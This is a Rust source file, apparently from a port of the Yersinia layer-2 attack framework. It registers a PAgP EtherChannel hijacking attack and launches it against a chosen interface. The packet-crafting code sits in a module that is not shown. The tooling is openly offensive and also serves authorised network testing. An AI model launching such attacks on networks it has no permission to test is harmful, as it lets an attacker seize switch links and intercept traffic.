//! PAgP Protocol
use async_trait::async_trait;
use std::sync::atomic::AtomicBool;
use std::sync::Arc;
use std::time::SystemTime;
use tokio::sync::RwLock;
use yersinia_core::{
    protocol::{AttackParams, Protocol, ProtocolStats},
    Attack, AttackContext, AttackDescriptor, AttackHandle, AttackId, AttackStatsCounters, Error,
    Interface, Packet, Parameter, ProtocolId, Result,
};

use super::attack::PagpHijackAttack;

pub struct PagpProtocol {
    stats: Arc<RwLock<ProtocolStats>>,
}
impl PagpProtocol {
    pub fn new() -> Self {
        Self {
            stats: Arc::new(RwLock::new(ProtocolStats::default())),
        }
    }
}
impl Default for PagpProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Protocol for PagpProtocol {
    fn name(&self) -> &'static str {
        "Port Aggregation Protocol"
    }
    fn shortname(&self) -> &'static str {
        "pagp"
    }
    fn id(&self) -> ProtocolId {
        ProtocolId::PAGP
    }
    fn attacks(&self) -> &[AttackDescriptor] {
        static ATTACKS: [AttackDescriptor; 1] = [AttackDescriptor {
            id: AttackId(0),
            name: "PAgP Etherchannel Hijacking",
            description: "Hijack etherchannel negotiation",
            parameters: vec![],
        }];
        &ATTACKS
    }
    fn parameters(&self) -> Vec<Box<dyn Parameter>> {
        vec![]
    }
    fn handle_packet(&mut self, packet: &Packet) -> Result<()> {
        let mut stats = self.stats.try_write().map_err(|_| Error::protocol("L"))?;
        stats.packets_received += 1;
        stats.bytes_received += packet.data.len() as u64;
        Ok(())
    }
    async fn launch_attack(
        &self,
        attack_id: AttackId,
        params: AttackParams,
        interface: &Interface,
    ) -> Result<AttackHandle> {
        match attack_id.0 {
            0 => {
                // Get device_id and port_id from params or use defaults
                let device_id = if let Some(dev_str) = params.get_string("device_id") {
                    let bytes = hex::decode(dev_str.replace(":", ""))
                        .unwrap_or(vec![0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);
                    let mut arr = [0u8; 6];
                    arr.copy_from_slice(&bytes[..6.min(bytes.len())]);
                    arr
                } else {
                    interface.mac_address.0
                };

                let port_id = if let Some(port_str) = params.get_string("port_id") {
                    let bytes = hex::decode(port_str.replace(":", ""))
                        .unwrap_or(vec![0x00, 0x01, 0x02, 0x03, 0x04, 0x05]);
                    let mut arr = [0u8; 6];
                    arr.copy_from_slice(&bytes[..6.min(bytes.len())]);
                    arr
                } else {
                    [0x00, 0x01, 0x02, 0x03, 0x04, 0x05]
                };

                let attack = PagpHijackAttack::new(device_id, port_id);

                let running = Arc::new(AtomicBool::new(true));
                let paused = Arc::new(AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "PAgP".to_string(),
                    attack_name: "Etherchannel Hijacking".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }
            _ => Err(Error::protocol("Invalid attack ID")),
        }
    }
    fn stats(&self) -> ProtocolStats {
        self.stats.try_read().map(|s| s.clone()).unwrap_or_default()
    }
    fn reset_stats(&mut self) {
        if let Ok(mut s) = self.stats.try_write() {
            *s = ProtocolStats::default();
        }
    }
}
